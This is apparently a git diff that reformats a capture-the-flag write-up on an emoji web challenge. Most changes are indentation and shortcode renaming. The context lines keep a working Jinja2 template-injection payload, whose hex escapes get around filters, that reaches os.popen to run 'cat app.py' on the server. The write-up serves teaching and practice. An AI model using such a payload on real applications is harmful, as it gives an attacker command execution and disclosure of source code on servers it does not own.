@@ -25,7 +25,7 @@ aliases = [
 ]
 +++
 
-- Points: 1700
+-   Points: 1700
 
 ## Description
 
@@ -41,12 +41,12 @@ When opening the source of the page we also find the following comment: "Here is
 
 ```js
 function send() {
-  let emoji = $("#emoji")[0].value;
-  if (emoji.length > 0) {
-    $.post("/", { emoji: emoji }, function (data) {
-      $("#msg")[0].innerHTML = "<b>" + data + "</b>";
-    });
-  }
+    let emoji = $("#emoji")[0].value;
+    if (emoji.length > 0) {
+        $.post("/", { emoji: emoji }, function (data) {
+            $("#msg")[0].innerHTML = "<b>" + data + "</b>";
+        });
+    }
 }
 ```
 
@@ -154,7 +154,7 @@ To get the subclasses, we first have to convert `''.__class__.__mro__[1].__subcl
 
 After submitting this, we get the following result:
 
-{{< code language="text" title="Result" >}}
+{{< collapsible-block badge="text" title="Result" >}}
 
 ```js
 [
@@ -643,7 +643,7 @@ After submitting this, we get the following result:
 ]
 ```
 
-{{< /code >}}
+{{< /collapsible-block >}}
 
 In this result we find the following class: `<class 'os._wrap_close'>`. This is the `os` module and it is on index `127`. We can verify it's index by getting it from the submodules list using the following input:
 
@@ -680,7 +680,7 @@ Now let's grab the contents of `app.py`:
 {{ [[[""|attr("\x5f\x5fclass\x5f\x5f")|attr("\x5f\x5fmro\x5f\x5f")][0][1]|attr("\x5f\x5fsubclasses\x5f\x5f")()][0][127]|attr("\x5f\x5finit\x5f\x5f")|attr("\x5f\x5fglobals\x5f\x5f")][0]["popen"]("cat app\x2epy")|attr("read")() }}
 ```
 
-{{< code language="python" title="app.py" >}}
+{{< collapsible-block badge="python" title="app.py" >}}
 
 ```py
 import random
@@ -732,7 +732,7 @@ if __name__ == '__main__':
     app.run(host='0.0.0.0', port=8000)
 ```
 
-{{< /code >}}
+{{< /collapsible-block >}}
 
 ## Magic function
 
